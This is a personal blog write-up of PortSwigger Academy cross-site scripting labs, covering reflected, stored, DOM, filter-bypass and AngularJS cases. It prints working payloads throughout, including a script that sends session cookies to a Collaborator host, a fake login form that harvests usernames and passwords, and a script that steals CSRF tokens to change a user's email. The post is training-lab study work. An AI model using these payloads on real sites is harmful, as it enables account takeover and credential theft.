---
title: "XSS Labs"
date: 2025-08-17T16:59:32+03:00
draft: true
lightgallery: true
authors: [Thuri]
tags: ["appsec", "websec", "portswigger", "XSS"]
summary: "Deserialization."
toc:
    enable: true
    auto: false
code:
    maxShownLines: 100
description: "Cross Site Scripting"
---

## Introduction

Cross-site scripting (XSS) is a web security vulnerability that allows an attacker to compromise interactions that users have with the vulnerable application. They are three main categories of XSS namely; Reflected, Stored and DOM XSS. This blog is an attempt to solve the [Portswigger Academy XSS Labs](https://portswigger.net/web-security/cross-site-scripting#what-is-cross-site-scripting-xss) and refresh my knowledge on the vulnerability class.

### XSS Attacks

The three main types of XSS are:

1. `Reflected XSS`: Where malicious script comes from the current HTTP Request.
2. `Stored  XSS`: where malicious script is persistent by storing in the application database.
3. `DOM-based XSS`: Where vulnerability exists in the client-side.

## XSS labs

In the attempt to solving the portswigger academy XSS labs, we will use the `xssbuster` string as our placeholder string in the applications so as to trace the application's sinks.

### Reflected XSS into HTML context with nothing encoded

> [!info]
> This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.
> To solve the lab, perform a cross-site scripting attack that calls the `alert` function.

The application directly reflects the searched word in the `H1` element as shown in the code below.

```html
<h1>0 search results for 'xssbuster'</h1>
```

By searching `<script>alert(1)</script>` instead of `xssbuster` we are able to execute `alert` and solve the challenge.

### Stored XSS into HTML context with nothing encoded

> [!info]
> This lab contains a stored cross-site scripting vulnerability in the comment functionality.
> To solve this lab, submit a comment that calls the alert function when the blog post is viewed.

The lab is similiar to the previous one. The comment functionality does not any validation and sanitization on the user input hence the comment is directly stored in the database. The user comment is then reflected in the `p` element.

```html
<p>xssbuster</p>
```

By replacing the string with `<script>alert(1)</script>` we are able to solve the challenge.

### DOM XSS in document.write sink using source location.search

> [!info]
> This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

By poking at the application's source code, we are able to identify the DOM sink `document.write` as shown below.

```javascript
function trackSearch(query) {
    document.write(
        '<img src="/resources/images/tracker.gif?searchTerms=' + query + '">'
    );
}
var query = new URLSearchParams(window.location.search).get("search");
if (query) {
    trackSearch(query);
}
```

The applications user search query and embeds it in the `img` tag and returns the results to the user. Since the applications does not do any sanitization of the user's input, we can escape the `img` tag and execute our payload. The payload is `"><svg onload=alert(1)>`.

> [!important]
> Some of the main sinks that lead to DOM-based XSS vulnerabilities are:
>
> -   document.write()
> -   document.write()
> -   document.writeln()
> -   document.domain
> -   element.innerHTML
> -   element.outerHTML
> -   element.insertAdjacentHTML
> -   element.onevent

### DOM XSS in innerHTML sink using source location.search

> [!info]
> This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search

The first challenge is to look at the application's source code to see how it handles the user input and for any DOM sinks.

```javascript
function doSearchQuery(query) {
    document.getElementById("searchMessage").innerHTML = query;
}
var query = new URLSearchParams(window.location.search).get("search");
if (query) {
    doSearchQuery(query);
}
```

The applications uses `element.innerHTML` as sink as shown in the code above. Since there is no user sanitization of the input, we are able to solve by using `<svg onload=alert(1)>` as our payload.

### DOM XSS in jQuery anchor href attribute sink using location.search source

> [!Info]
> This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's `$` selector function to find an anchor element, and changes its href attribute using data from location.search.
> To solve this lab, make the "back" link alert document.cookie.

The goal is to execute the XSS payload when the victim clicks the "back" link.

The website has a Submit Feedback section, which allows users to send feedback to the user. The href is `/feedback?returnPath=xssbuster`. when an user clicks the "back", the website redirects to the path defined at the `returnPath`. For the example above redirects to xssbuster path.

By using the javascript pseudo protocol, we are able to execute the `alert`.

```javascript
javascript: alert(document.cookie);
```

### DOM XSS in jQuery selector sink using a hashchange event

> [!Info]
> This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.

> To solve the lab, deliver an exploit to the victim that calls the print() function in their browser.

### Reflected XSS into attribute with angle brackets HTML-encoded

> [!Info]
> This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.

Looking at the source code of the application, we can see the `<script>` payload is encoded and stored in the `h1` and `input` elements as shown below.

```html
<section class=blog-header>
    <h1>0 search results for '&lt;script&gt;alert(xssbuster)&lt;/script&gt;'</h1>
    <hr>
</section>
<section class=search>
    <form action=/ method=GET>
        <input type=text placeholder='Search the blog...' name=search value="&lt;script&gt;alert(xssbuster)&lt;/script&gt;">
        <button type=submit class=button>Search</button>
    </form>
</section>
```

To solve the challenge, we can use the `input` element to craft our payload and call alert. The crafted payload to use is `"onmouseover="alert(1)`. On trying `"onmousedown"` event, the payload alerts, but does not solve the problem.

### Stored XSS into anchor href attribute with double quotes HTML-encoded

> This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.

Looking a the source code, the application does not specify if we use `https` or `http` for user input. Therefore is possible to use `javascript:alert(1)` on the Website label.

```html
<label>Website:</label>

<input type="text" name="website" />
```

### Reflected XSS into a JavaScript string with angle brackets HTML encoded

> This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.

First is to use a string placeholder to check where the string is being reflected.

```html
<script>
    var searchTerms = "xssbuster";
    document.write(
        '<img src="/resources/images/tracker.gif?searchTerms=' +
            encodeURIComponent(searchTerms) +
            '">'
    );
</script>
```

The userstring is reflected at `xssbuster`. Now we need to use `'-alert(1)-'` as our searchTerms.

### DOM XSS in document.write sink using source location.search inside a select element

### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

### Reflected DOM XSS

> This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

Looking at the search results

```json
{ "results": [], "searchTerm": "xssbuster" }
```

Escape the JSON content by using the following payload `\"-alert(1)}//`, the double splash is for commenting out the rest of the code.

### Stored DOM XSS

> This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the alert() function.

Looking at the source code as follows for the json stored data

```json
[
    {
        "avatar": "",
        "website": "",
        "date": "2025-08-05T15:18:27.347Z",
        "body": "I thought this blog came from a good angle. I read it lying down.",
        "author": "Kit Kat"
    },
    {
        "avatar": "",
        "website": "https://google.com",
        "date": "2025-08-18T13:19:20.856247556Z",
        "body": "xssbuster",
        "author": "AAA"
    }
]
```

The website implements some defenses to prevent the attacker

```javascript
function escapeHTML(html) {
    return html.replace("<", "&lt;").replace(">", "&gt;");
}
```

From the code below, the avatar is created using the comment supplied by the user

```javascript
let avatarImgElement = document.createElement("img");
avatarImgElement.setAttribute("class", "avatar");
avatarImgElement.setAttribute(
    "src",
    comment.avatar
        ? escapeHTML(comment.avatar)
        : "/resources/images/avatarDefault.svg"
);
```

Therefore to exploit the vulnerability, we can use the `img` tag. The payload is `<><img src=1 onerror=alert(1)>`

### Reflected XSS into HTML context with most tags and attributes blocked

> [!Info]
> This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.

To solver the challenge, we use our string `xssbuster` to see where the XSS vulnerability is manifested.

```html
<section class="blog-header">
    <h1>0 search results for 'xssbuster'</h1>
    <hr />
</section>
```

Since the payload is not sanitized, we try and use `<script>alert(1)</script>` and we get an error `"Tag is not allowed"`. From this we can test all the XSS payloads using Burp Intruder to see the allowed payloads.

{{< image src="/xsslabs/lab intruder.png" caption="Intruder Position" >}}

Then after sending the payloads, we look for the payload which brings the status okay `200`.

{{< image src="/xsslabs/lab body.png" caption="Body Tag" >}}
From the results, `body` element is allowed tag, therefore crafting the payload using the `body` tag. The final payload to send to the victim using the provided exploit server by clicking `store` and then `Deliver exploit to victim`

```html
<iframe
    src="https://0a9400660476ae6a80da037d001b007c.web-security-academy.net/?search=%3cbody%20onresize%3d%22print()%22%3e"
    onload="this.style.width"
    ="100px"
></iframe>
```

### Reflected XSS into HTML context with all tags blocked except custom ones

> [!Info]
> This lab blocks all HTML tags except custom ones.

> To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.
> This challenge blocks all tags excepet the custom ones.

Example of custom payload is `<xss onfocus=alert(1) autofocus tabindex=1>`, which fires when `autofocused`. By pasting in the search functionality we are able to alert.
we need to deliver the payload to the victim using the exploit server as shown below

```html
<script>
    location =
        "https://0ae60073043bd6878428d2c70083001f.web-security-academy.net/?search=%3Cxss+onfocus%3Dalert%281%29+autofocus+tabindex%3D1%3E";
</script>
```

Click store and `deliver exploit to victim` in the server.

### Reflected XSS with some SVG markup allowed

> This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.

The Challenge is similiar to previous challenge using Burp Intruder. The application allows SVG but some events are blocked.

By using `<svg><animatetransform onbegin=alert(1) attributeName=transform>` we are solve the challenge.

### DOM XSS in document.write sink using source location.search inside a select element

> [!Info]
> This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

The first step is to look at the application's source code

```html
<script>
    var stores = ["London", "Paris", "Milan"];
    var store = new URLSearchParams(window.location.search).get("storeId");
    document.write('<select name="storeId">');
    if (store) {
        document.write("<option selected>" + store + "</option>");
    }
    for (var i = 0; i < stores.length; i++) {
        if (stores[i] === store) {
            continue;
        }
        document.write("<option>" + stores[i] + "</option>");
    }
    document.write("</select>");
</script>
```

From the code above, the `storeId` is one vulnerable. By setting the path `/product?productId=1&storeId="</select><img%20src=1%20onerror=alert(1)>` we are able to solve the challenge

### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

> [!Info]
> This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.
> AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.
> To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function

By looking at the homepage of the application we are able to determine it is an angular application as shown in the image below.

{{< image src="/xsslabs/lab ngk.png" caption="Angular Application" >}}

By testing `{{1+1}}` on the search functionality we get the result is equal to `2`.

{{< image src="/xsslabs/lab sum.png" caption="Angular Application" >}}

From this, means the application is able to execute Javascript expressions with double curly braces. Therefore using the `{{constructor.constructor('alert(1)')()}}` payload, we are able to execute solve the challenge.

### Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

> [!Info]
> This lab contains a stored cross-site scripting vulnerability in the comment functionality.
> To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.

The first step is to look into the comment functionality and how it handles the Author's name.

```html
<section class="comment">
    <p>
        <img src="/resources/images/avatarDefault.svg" class="avatar" />
        <a
            id="author"
            href="https://google.com"
            onclick="var tracker={track(){}};tracker.track('https://google.com');"
            >Sopranos</a
        >
        | 20 August 2025
    </p>
    <p>xssbuster1</p>
    <p></p>
</section>
```

To bypass this, we can use HTML encoding to bypass the deployed filter defences. By using the payload `&apos;-alert(document.domain)-&apos;`, we are able to bypass the filters and execute `alert`

### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

> [!Info]
> This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the alert function inside the template string.

Javascript template literals are string literals that allow embedded JavaScript expressions. Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the `${...}` syntax.

The first step is to use our string `xssbuster` and look for the sink and untrusted user input handling. The code is as follows

```html
<script>
    var message = `0 search results for 'xssbuster'`;
    document.getElementById("searchMessage").innerText = message;
</script>
```

Since the variable message uses backtick and embedds the message into the `element.innetText`, means we can execute our string literal like `${alert(document.domain)}` in the search functionality and solve the challenge.

### Exploiting cross-site scripting to steal cookies

> [!Info]
> This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

The goal of this challenge is to steal the cookie of the victim user and impersonate him.

The payload to use is as follows

```html
<script>
    // Access user's page data
    document;
    // Steal session cookies
    new Image().src = "https://collabrator.DOMAIN/?cookie=" + document.cookie;
</script>
```

By commenting the above script in the comment functionality we are able to leak the Victim's cookie in our burp collabrator.

{{< image src="/xsslabs/lab cookie.png" caption="Cookie Leak" >}}

By setting the leaked session in our browser we are able to solve the challenge.

### Exploiting cross-site scripting to capture passwords

> [!info]
> This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

To solve this lab and steal the victims we need to understand how the Login functionality of the application handles the password. First step is to check the source code of the login form as shown below.

```html
<form class="login-form" method="POST" action="/login">
    <input
        required
        type="hidden"
        name="csrf"
        value="JshENWvNkjS4bEwYF2O89S3g5pwlBfUr"
    />
    <label>Username</label>
    <input required type="username" name="username" autofocus />
    <label>Password</label>
    <input required type="password" name="password" />
    <button class="button" type="submit">Log in</button>
</form>
```

From the form above, we can the applications requires the username and password. From this we can craft our payload and deliver to user.

```html
<input type="text" name="username" />
<input type="password" name="password" onchange="dothis()" />

<script>
    function dothis() {
        var username = document.getElementsByName("username")[0].value;
        var password = document.getElementsByName("password")[0].value;
        var token = document.getElementsByName("csrf")[0].value;
        var data = new FormData();

        data.append("csrf", token);
        data.append("postId", 8);
        data.append("comment", `${username}:${password}`);
        data.append("name", "victim");
        data.append("email", "victim@email.com");
        data.append("website", "http://google.com");

        fetch("/post/comment", {
            method: "POST",
            mode: "no-cors",
            body: data,
        });
    }
</script>
```

By posting the above payload in our comment section, we are able to get the password for administrator.

{{< image src="/xsslabs/lab password.png" caption="Cookie Leak" >}}

### Exploiting XSS to bypass CSRF defenses

> [!Info]
> This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments.

> [!Important]
> You can log in to your own account using the following credentials: wiener:peter

The route vulnerable to the CSRF vulnerability is the `/my-account/change-email`. To solve the challenge, we can use burp engangement tool to generate our CSRF POC as shown below.

```html
<html>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <body>
        <form
            action="https://0aa700f60378b81c815b43c500c30001.web-security-academy.net/my-account/change-email"
            method="POST"
        >
            <input type="hidden" name="email" value="mail&#64;gmail&#46;com" />
            <input
                type="hidden"
                name="csrf"
                value="ZCxhCGo0J07WxGk0GrjIX6fo9TRi8zMt"
            />
            <input type="submit" value="Submit request" />
        </form>
        <script>
            history.pushState("", "", "/");
            document.forms[0].submit();
        </script>
    </body>
</html>
```

By submitting the above, in the comment section with changed email, we can confirm our email for the user `wiener` has changed. Since the `csrf` is dynamically generated, we use the following payload and deliver to our victim

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = handleResponse;
    req.open("get", "/my-account", true);
    req.send();
    function handleResponse() {
        var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
        var changeReq = new XMLHttpRequest();
        changeReq.open("post", "/my-account/change-email", true);
        changeReq.send("csrf=" + token + "&email=test@test.com");
    }
</script>
```

By submitting the above as our payload, we are able to solve the lab.

## References

1. [Cross-Site Scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
